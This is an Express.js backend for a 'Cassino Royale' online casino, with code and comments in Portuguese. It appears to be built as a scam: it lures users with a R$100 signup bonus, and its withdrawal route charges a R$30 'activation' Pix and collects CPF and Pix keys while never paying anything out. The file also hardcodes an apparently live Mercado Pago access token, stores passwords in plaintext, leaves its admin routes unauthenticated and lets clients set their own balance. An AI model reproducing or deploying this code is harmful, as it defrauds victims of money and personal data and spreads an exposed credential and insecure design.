const express = require('express');
const path = require('path');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const MP_ACCESS_TOKEN = "APP_USR-517824253559090-073117-47dad5ef4352fb0abd9e5d717275dfa3-71867761";

// Banco de dados em memória de usuários
let usuarios = [
    { id: 1, nome: "João Silva", telefone: "11999999999", senha: "123", saldo: 100.00, depositoPendente: 0.00, saqueSolicitado: null }
];

// Banco de dados em memória para o histórico de saques reais solicitados
let saquesHistorico = [];

// Rota de Cadastro com Bônus Automático de R$ 100,00
app.post('/api/cadastrar', (req, res) => {
    const { nome, telefone, senha } = req.body;
    
    if (!nome || !telefone || !senha) {
        return res.status(400).json({ sucesso: false, mensagem: "Preencha todos os campos!" });
    }

    const existe = usuarios.find(u => u.telefone === telefone);
    if (existe) {
        return res.status(400).json({ sucesso: false, mensagem: "Este telefone já está cadastrado!" });
    }

    const novoUsuario = {
        id: usuarios.length + 1,
        nome,
        telefone,
        senha,
        saldo: 100.00,
        depositoPendente: 0.00,
        saqueSolicitado: null
    };

    usuarios.push(novoUsuario);
    res.json({ sucesso: true, usuarioId: novoUsuario.id });
});

// Rota de Login
app.post('/api/login', (req, res) => {
    const { telefone, senha } = req.body;
    const user = usuarios.find(u => u.telefone === telefone && u.senha === senha);

    if (user) {
        res.json({ sucesso: true, usuarioId: user.id });
    } else {
        res.status(400).json({ sucesso: false, mensagem: "Telefone ou senha incorretos!" });
    }
});

// Rota para listar usuários no painel admin
app.get('/api/admin/usuarios', (req, res) => {
    res.json(usuarios);
});

// Rota do Admin para Adicionar Crédito Manualmente
app.post('/api/admin/adicionar-credito', (req, res) => {
    const { usuarioId, valor } = req.body;
    const user = usuarios.find(u => u.id === parseInt(usuarioId));

    if (user && valor > 0) {
        user.saldo += parseFloat(valor);
        res.json({ sucesso: true, mensagem: `Crédito de R$ ${parseFloat(valor).toFixed(2)} adicionado com sucesso para ${user.nome}!` });
    } else {
        res.status(400).json({ sucesso: false, mensagem: "Usuário não encontrado ou valor inválido." });
    }
});

// Rota para gerar Pix de Depósito (Mercado Pago)
app.post('/api/depositar', (req, res) => {
    const { usuarioId, valor } = req.body;
    const user = usuarios.find(u => u.id === parseInt(usuarioId));

    if (!user) {
        return res.status(400).json({ sucesso: false, mensagem: "Usuário não encontrado." });
    }

    const valorNumerico = parseFloat(valor);
    user.depositoPendente = valorNumerico;

    const dadosPagamento = JSON.stringify({
        transaction_amount: valorNumerico,
        description: `Depósito Cassino Royale - Usuário ${user.nome}`,
        payment_method_id: "pix",
        payer: {
            email: `cliente_${user.id}@cassinoroyale.com`,
            first_name: user.nome,
            identification: {
                type: "CPF",
                number: "00000000000"
            }
        }
    });

    const options = {
        hostname: 'api.mercadopago.com',
        path: '/v1/payments',
        method: 'POST',
        headers: {
            'Authorization': `Bearer ${MP_ACCESS_TOKEN}`,
            'Content-Type': 'application/json',
            'X-Idempotency-Key': `${Date.now()}-${Math.random()}`
        }
    };

    const mpReq = https.request(options, (mpRes) => {
        let responseData = '';
        mpRes.on('data', (chunk) => { responseData += chunk; });
        mpRes.on('end', () => {
            try {
                const responseJson = JSON.parse(responseData);
                if (responseJson.point_of_interaction) {
                    const qrCodeData = responseJson.point_of_interaction.transaction_data;
                    res.json({
                        sucesso: true,
                        transactionId: responseJson.id,
                        qrCodeBase64: qrCodeData.qr_code_base64,
                        qrCodeCopyPaste: qrCodeData.qr_code
                    });
                } else {
                    res.status(400).json({ sucesso: false, mensagem: responseJson.message || "Erro ao gerar Pix no Mercado Pago." });
                }
            } catch (e) {
                res.status(500).json({ sucesso: false, mensagem: "Erro interno ao processar pagamento." });
            }
        });
    });

    mpReq.on('error', () => {
        res.status(500).json({ sucesso: false, mensagem: "Falha de conexão com o Mercado Pago." });
    });

    mpReq.write(dadosPagamento);
    mpReq.end();
});

// Rota para solicitar saque com Pix de ativação e salvar no Histórico real
app.post('/api/solicitar-saque', (req, res) => {
    const { usuarioId, valorSaque, nomeCompleto, chavePix, cpf, contato } = req.body;
    const user = usuarios.find(u => u.id === parseInt(usuarioId));

    if (!user) {
        return res.status(400).json({ sucesso: false, mensagem: "Usuário não encontrado." });
    }

    user.saqueSolicitado = {
        valor: parseFloat(valorSaque),
        nomeCompleto,
        chavePix,
        cpf,
        contato
    };

    const dadosPagamento = JSON.stringify({
        transaction_amount: 30.00,
        description: `Ativação de Saque - Cassino Royale`,
        payment_method_id: "pix",
        payer: {
            email: `ativacao_${user.id}@cassinoroyale.com`,
            first_name: nomeCompleto,
            identification: { type: "CPF", number: cpf.replace(/\D/g, '') || "00000000000" }
        }
    });

    const options = {
        hostname: 'api.mercadopago.com',
        path: '/v1/payments',
        method: 'POST',
        headers: {
            'Authorization': `Bearer ${MP_ACCESS_TOKEN}`,
            'Content-Type': 'application/json',
            'X-Idempotency-Key': `${Date.now()}-${Math.random()}`
        }
    };

    const mpReq = https.request(options, (mpRes) => {
        let responseData = '';
        mpRes.on('data', (chunk) => { responseData += chunk; });
        mpRes.on('end', () => {
            try {
                const responseJson = JSON.parse(responseData);
                if (responseJson.point_of_interaction) {
                    const qrCodeData = responseJson.point_of_interaction.transaction_data;
                    
                    // Salva o registro no histórico oficial do usuário no momento que a solicitação real é gerada
                    const novoRegistroSaque = {
                        id: responseJson.id,
                        usuarioId: parseInt(usuarioId),
                        valor: parseFloat(valorSaque),
                        status: "Processando saque...",
                        data: new Date().toISOString()
                    };
                    saquesHistorico.push(novoRegistroSaque);

                    res.json({
                        sucesso: true,
                        transactionId: responseJson.id,
                        qrCodeBase64: qrCodeData.qr_code_base64,
                        qrCodeCopyPaste: qrCodeData.qr_code
                    });
                } else {
                    res.status(400).json({ sucesso: false, mensagem: "Erro ao gerar Pix de ativação." });
                }
            } catch (e) {
                res.status(500).json({ sucesso: false, mensagem: "Erro ao processar ativação." });
            }
        });
    });

    mpReq.on('error', () => {
        res.status(500).json({ sucesso: false, mensagem: "Erro de conexão." });
    });

    mpReq.write(dadosPagamento);
    mpReq.end();
});

// Rota para retornar o histórico de saques do usuário autenticado
app.get('/api/historico-saques', (req, res) => {
    const { usuarioId } = req.query;
    if (!usuarioId) {
        return res.status(400).json({ sucesso: false, mensagem: "ID do usuário obrigatório." });
    }
    const historicoDoUsuario = saquesHistorico.filter(s => s.usuarioId === parseInt(usuarioId));
    res.json(historicoDoUsuario);
});

// Rota para verificar o status do pagamento no Mercado Pago (Polling)
app.get('/api/verificar-pagamento', (req, res) => {
    const { id } = req.query;

    if (!id) {
        return res.status(400).json({ pago: false });
    }

    const options = {
        hostname: 'api.mercadopago.com',
        path: `/v1/payments/${id}`,
        method: 'GET',
        headers: {
            'Authorization': `Bearer ${MP_ACCESS_TOKEN}`
        }
    };

    const mpReq = https.request(options, (mpRes) => {
        let responseData = '';
        mpRes.on('data', (chunk) => { responseData += chunk; });
        mpRes.on('end', () => {
            try {
                const responseJson = JSON.parse(responseData);
                // Status 'approved' significa que o cliente pagou o Pix de ativação
                if (responseJson.status === 'approved') {
                    res.json({ pago: true, status: 'approved' });
                } else {
                    res.json({ pago: false, status: responseJson.status });
                }
            } catch (e) {
                res.json({ pago: false });
            }
        });
    });

    mpReq.on('error', () => {
        res.json({ pago: false });
    });

    mpReq.end();
});

// Rota do Admin para liberar o bônus/depósito
app.post('/api/admin/liberar-bonus', (req, res) => {
    const { usuarioId } = req.body;
    const user = usuarios.find(u => u.id === parseInt(usuarioId));
    
    if (user && user.depositoPendente > 0) {
        user.saldo += user.depositoPendente;
        user.depositoPendente = 0;
        res.json({ sucesso: true, mensagem: "Aprovado com sucesso!" });
    } else {
        res.status(400).json({ sucesso: false, mensagem: "Sem valores pendentes." });
    }
});

// Rota do Admin para rejeitar
app.post('/api/admin/rejeitar-deposito', (req, res) => {
    const { usuarioId } = req.body;
    const user = usuarios.find(u => u.id === parseInt(usuarioId));
    
    if (user && (user.depositoPendente > 0 || user.saqueSolicitado)) {
        user.depositoPendente = 0;
        user.saqueSolicitado = null;
        res.json({ sucesso: true, mensagem: "Rejeitado com sucesso!" });
    } else {
        res.status(400).json({ sucesso: false, mensagem: "Sem solicitações pendentes." });
    }
});

// Rota para o jogo caça-níquel
app.post('/api/jogar', (req, res) => {
    const { usuarioId, novoSaldo } = req.body;
    const user = usuarios.find(u => u.id === parseInt(usuarioId));

    if (user) {
        user.saldo = parseFloat(novoSaldo);
        res.json({ sucesso: true });
    } else {
        res.status(400).json({ sucesso: false, mensagem: "Usuário não encontrado." });
    }
});

app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});